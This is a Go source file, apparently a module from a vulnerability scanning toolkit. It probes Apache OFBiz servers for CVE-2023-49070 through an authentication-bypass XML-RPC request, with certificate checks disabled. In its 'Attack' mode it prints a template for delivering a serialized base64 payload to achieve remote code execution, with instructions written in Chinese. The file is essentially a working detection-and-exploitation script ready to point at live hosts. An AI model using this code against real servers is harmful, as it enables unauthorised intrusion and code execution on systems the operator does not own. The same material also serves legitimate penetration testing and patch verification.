package CVEs

import (
	"crypto/tls"
	"fmt"
	"io/ioutil"
	"net/http"
	"strconv"
	"strings"
	"time"
)

func CVE_2023_49070(url string, Attack bool) error {
	randomNumber := generateRandomNumber()
	randomString := strconv.Itoa(randomNumber)
	payload := "<?xml version=\"1.0\"?><methodCall><methodName>ProjectDiscovery</methodName><params><param><value>" + randomString + "</value></param></params></methodCall>"

	// 创建自定义的 Transport(禁用SSL)
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		Proxy:           http.ProxyURL(proxyURL()), // 设置代理信息
	}

	client := &http.Client{
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
		Transport: tr,
		Timeout:   10 * time.Second, // 设置超时时间为 10 秒
	}

	url1 := fmt.Sprintf("%s/webtools/control/xmlrpc;/?USERNAME=&PASSWORD=&requirePasswordChange=Y", url)
	//fmt.Println("test")
	request, err := http.NewRequest("POST", url1, strings.NewReader(payload))
	request.Header.Add("Content-Type", "application/xml")
	request.Header.Add("Host", "127.0.0.1")
	request.Header.Add("Content-Length", fmt.Sprint(len(payload)))
	if err != nil {
		return err
	}
	response, err := client.Do(request)
	if err != nil {
		return err
	}
	body, err := ioutil.ReadAll(response.Body)
	if err != nil {
		return err
	}
	defer response.Body.Close()

	cookies := response.Header["Set-Cookie"]

	if response.StatusCode == http.StatusOK && strings.Contains(string(body), "faultCode") && strings.Contains(string(body), "faultString") && strings.Contains(string(body), "XML-RPC") {
		for _, cookie := range cookies {
			if strings.Contains(cookie, "OFBiz.Visitor") {
				fmt.Println("[*]CVE-2023-49070 : " + url)
				if Attack {
					fmt.Println("Attack-Result : " + fmt.Sprintf("请使用POST方法在%s下传入请求体：`<?xml version=\"1.0\"?>\n<methodCall>\n  <methodName>ProjectDiscovery</methodName>\n  <params>\n    <param>\n      <value>\n        <struct>\n          <member>\n            <name>test</name>\n            <value>\n              <serializable xmlns=\"http://ws.apache.org/xmlrpc/namespaces/extensions\">base64code</serializable>\n            </value>\n          </member>\n        </struct>\n      </value>\n    </param>\n  </params>\n</methodCall>`\n", url1))
				}
			}
		}
	}

	return nil
}
